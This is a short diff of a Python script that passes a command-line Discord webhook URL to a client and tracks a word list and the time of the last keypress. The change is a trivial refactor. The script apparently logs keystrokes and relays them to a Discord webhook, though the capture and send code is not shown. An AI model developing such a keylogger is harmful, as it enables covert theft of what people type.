@@ -4,8 +4,7 @@ import threading
 from discordwebhook import Discord
 import sys
 
-hook = sys.argv[1]
-discord = Discord(url=(hook))
+discord = Discord(url=sys.argv[1])
 
 word = []
 last_pressed = time.time()
